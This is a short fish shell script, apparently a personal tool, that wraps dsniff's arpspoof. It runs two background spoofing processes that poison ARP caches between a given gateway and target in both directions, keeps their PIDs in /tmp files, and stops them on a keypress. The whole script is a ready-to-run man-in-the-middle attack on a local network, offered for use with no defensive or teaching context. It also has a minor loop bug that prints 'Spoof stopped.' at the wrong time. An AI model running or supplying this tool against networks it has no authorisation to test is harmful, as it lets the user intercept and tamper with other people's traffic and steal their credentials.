#!/usr/bin/env fish
# Check if you do have dsniff package installed

if test $EUID -ne 0
    echo "This script requires root privilege. Please run it with sudo."
    exit 1
end

set IS_PRESENT (type -p arpspoof)

# kill the process and remove the file.pid
function stopSpoof --argument pid_file
    set -l pid (cat $pid_file)
    kill $pid
    rm $pid_file
end

function spoof
    if test (count $argv) != 2 >/dev/null
        echo "usage => arpg <gateway> <target>"
        exit
    end

    set gateway $argv[1]
    set target $argv[2]

    set pid_file1 "/tmp/arpspoof.$(math (random) + (date +%s)).pid"
    set pid_file2 "/tmp/arpspoof.$(math (random) + (date +%s)).pid"

    arpspoof -r -t $gateway $target &>>/dev/null &
    echo $last_pid >$pid_file1
    arpspoof -r -t $target $gateway &>>/dev/null &
    echo $last_pid >$pid_file2

    while true
        echo "Press 'q' to stop the spoof"
        read -n 1 -p "" input
        if test $input = q
            stopSpoof $pid_file1
            stopSpoof $pid_file2
            break
        end
        echo "Spoof stopped."
    end
end

# make sure dsniff is installed
if test $IS_PRESENT
    set -l C $IS_PRESENT
    spoof $argv
else
    echo "dsniff is missing, please install it first"
end
